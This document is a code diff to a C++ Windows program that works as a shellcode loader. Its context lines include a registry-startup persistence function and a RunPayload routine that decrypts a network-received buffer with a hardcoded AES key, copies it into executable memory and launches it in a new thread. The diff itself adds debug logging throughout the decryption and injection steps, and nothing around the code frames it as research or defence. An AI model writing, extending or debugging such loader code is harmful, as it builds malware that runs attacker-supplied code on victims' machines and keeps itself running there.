@@ -14,6 +14,7 @@
 #include <tlhelp32.h>  // For process management functions
 #include <psapi.h>     // For GetModuleFileNameExW
 #include <shlobj.h>    // For SHGetFolderPathW and CSIDL_PROFILE
+#include <cstdint>     // For uint64_t
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment (lib, "Mswsock.lib")
@@ -374,27 +375,32 @@ bool AddToRegistryStartup() {
 
 // Function to decrypt AES-128 CBC encrypted data
 std::vector<BYTE> DecryptAES(const std::vector<BYTE>& encryptedData, const BYTE* keyMaterial, size_t keyLength) {
+    WriteLog("Starting AES decryption process");
     HCRYPTPROV hProv;
     HCRYPTKEY hKey;
     HCRYPTHASH hHash;
     std::vector<BYTE> decryptedData;
     
     if (!CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+        WriteLog("Failed to acquire crypto context");
         return decryptedData;
     }
 
     if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+        WriteLog("Failed to create hash");
         CryptReleaseContext(hProv, 0);
         return decryptedData;
     }
 
     if (!CryptHashData(hHash, keyMaterial, keyLength, 0)) {
+        WriteLog("Failed to hash key material");
         CryptDestroyHash(hHash);
         CryptReleaseContext(hProv, 0);
         return decryptedData;
     }
 
     if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
+        WriteLog("Failed to derive key");
         CryptDestroyHash(hHash);
         CryptReleaseContext(hProv, 0);
         return decryptedData;
@@ -402,14 +408,15 @@ std::vector<BYTE> DecryptAES(const std::vector<BYTE>& encryptedData, const BYTE*
 
     DWORD mode = CRYPT_MODE_CBC;
     if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
+        WriteLog("Failed to set CBC mode");
         CryptDestroyKey(hKey);
         CryptDestroyHash(hHash);
         CryptReleaseContext(hProv, 0);
         return decryptedData;
     }
 
-    // IV from the first 16 bytes
     if (encryptedData.size() < BLOCK_SIZE) {
+        WriteLog("Encrypted data too small for IV");
         CryptDestroyKey(hKey);
         CryptDestroyHash(hHash);
         CryptReleaseContext(hProv, 0);
@@ -417,31 +424,33 @@ std::vector<BYTE> DecryptAES(const std::vector<BYTE>& encryptedData, const BYTE*
     }
 
     if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)encryptedData.data(), 0)) {
+        WriteLog("Failed to set IV");
         CryptDestroyKey(hKey);
         CryptDestroyHash(hHash);
         CryptReleaseContext(hProv, 0);
         return decryptedData;
     }
 
-    // Create a copy without IV
     std::vector<BYTE> dataToDecrypt(encryptedData.begin() + BLOCK_SIZE, encryptedData.end());
     DWORD dataSize = dataToDecrypt.size();
+    WriteLog("Attempting to decrypt " + std::to_string(dataSize) + " bytes");
 
-    // Decrypt
     if (!CryptDecrypt(hKey, 0, TRUE, 0, dataToDecrypt.data(), &dataSize)) {
+        WriteLog("Failed to decrypt data");
         CryptDestroyKey(hKey);
         CryptDestroyHash(hHash);
         CryptReleaseContext(hProv, 0);
         return decryptedData;
     }
 
-    // Remove padding
     BYTE padding = dataToDecrypt[dataSize - 1];
     if (padding > 0 && padding <= BLOCK_SIZE) {
         dataSize -= padding;
+        WriteLog("Removed " + std::to_string(padding) + " bytes of padding");
     }
 
     decryptedData.assign(dataToDecrypt.begin(), dataToDecrypt.begin() + dataSize);
+    WriteLog("Successfully decrypted " + std::to_string(dataSize) + " bytes");
 
     CryptDestroyKey(hKey);
     CryptDestroyHash(hHash);
@@ -510,32 +519,42 @@ void RunPayload()
 
         // Convert hex key to BYTE array
         std::string hexKey = "df6b7d1be3467b0805b831bfed90b69a649381393efbb9cb295d1d307f78e650";
+        WriteLog("Using decryption key: " + hexKey);
         std::vector<BYTE> keyMaterial = HexToBytes(hexKey);
         
         if (keyMaterial.size() != 32) {
+            WriteLog("Invalid key material size: " + std::to_string(keyMaterial.size()));
             return;
         }
 
         // Decrypt the data
+        WriteLog("Starting payload decryption");
         std::vector<BYTE> decryptedData = DecryptAES(recvbuf, keyMaterial.data(), keyMaterial.size());
 
         if (decryptedData.empty()) {
+            WriteLog("Decryption failed - empty result");
             return;
         }
+
+        WriteLog("Successfully decrypted payload, size: " + std::to_string(decryptedData.size()));
 
         LPVOID alloc_mem = VirtualAlloc(NULL, decryptedData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (!alloc_mem) {
+            WriteLog("Failed to allocate memory for shellcode");
             return;
         }
 
+        WriteLog("Allocated memory for shellcode at: 0x" + std::to_string(reinterpret_cast<uint64_t>(alloc_mem)));
         CopyMemory(alloc_mem, decryptedData.data(), decryptedData.size());
 
         // Set memory protection
         DWORD oldProtect;
         if (!VirtualProtect(alloc_mem, decryptedData.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+            WriteLog("Failed to set memory protection");
             return;
         }
 
+        WriteLog("Memory protection set successfully");
         // Create thread with higher priority and detached state
         HANDLE tHandle = CreateThread(
             NULL,
